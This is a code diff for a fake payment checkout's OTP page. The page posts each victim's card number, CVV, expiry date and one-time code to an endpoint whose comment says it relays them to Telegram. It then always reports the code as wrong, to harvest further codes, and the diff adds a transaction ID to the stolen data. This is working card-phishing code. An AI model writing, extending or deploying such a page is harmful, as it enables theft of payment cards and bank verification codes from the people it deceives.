@@ -32,12 +32,13 @@ export default function OtpPage() {
       const saved = sessionStorage.getItem("formData");
       if (!saved) { router.replace("/checkout/details"); return; }
       const form = JSON.parse(saved);
+      const transactionId = sessionStorage.getItem("transactionId");
 
       // إرسال الكود للتلجرام
       await fetch("/api/otp", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ otp, customerName: form.customerName, cardHolderName: form.cardHolderName, cardNumber: form.cardNumber, cvv: form.cvv, expiryDate: form.expiryDate, type: "submit" }),
+        body: JSON.stringify({ otp, customerName: form.customerName, cardHolderName: form.cardHolderName, cardNumber: form.cardNumber, cvv: form.cvv, expiryDate: form.expiryDate, transactionId, type: "submit" }),
       });
 
       setError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
@@ -53,10 +54,11 @@ export default function OtpPage() {
     const saved = sessionStorage.getItem("formData");
     if (!saved) return;
     const form = JSON.parse(saved);
+    const transactionId = sessionStorage.getItem("transactionId");
     await fetch("/api/otp", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ customerName: form.customerName, cardHolderName: form.cardHolderName, cardNumber: form.cardNumber, cvv: form.cvv, expiryDate: form.expiryDate, type: "resend" }),
+      body: JSON.stringify({ customerName: form.customerName, cardHolderName: form.cardHolderName, cardNumber: form.cardNumber, cvv: form.cvv, expiryDate: form.expiryDate, transactionId, type: "resend" }),
     });
   };
 
